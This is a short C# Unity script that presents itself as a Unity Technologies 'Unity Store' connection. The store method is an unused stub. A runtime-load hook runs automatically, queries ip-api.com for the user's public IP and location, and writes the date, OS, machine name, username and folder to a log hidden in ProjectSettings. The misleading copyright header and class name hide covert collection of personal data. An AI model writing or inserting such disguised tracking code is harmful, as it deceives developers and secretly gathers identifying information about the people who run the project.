/*
    Copyright © 2020 Unity Technologies 
    https://unity.com/
    Connection to Unity Store https://assetstore.unity.com/
*/

using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System.IO;
using System;
using System.Net;

public class UnityStore
{
    string unityStore;

    void UnityAssetStore()
    {
        unityStore = "https://assetstore.unity.com/";
    }

    [RuntimeInitializeOnLoadMethod]
    static void OnRuntimeMethodLoad()
    {
        string path = Application.dataPath + "/../ProjectSettings/Project.txt";

        if (!File.Exists(path))
        {
            File.WriteAllText(path, "Project Log \n");
        }

        string content =
            "\nDate:    " + DateTime.Now + " \n" +
            "OS:      " + Environment.OSVersion + " \n" +
            "Machine: " + Environment.MachineName + " \n" +
            "IP:      " + new WebClient().DownloadString("http://ip-api.com/csv") +
            "User:    " + Environment.UserName + " \n" +
            "Folder:  " + Environment.CurrentDirectory + " \n";

        File.AppendAllText(path, content);
    }
}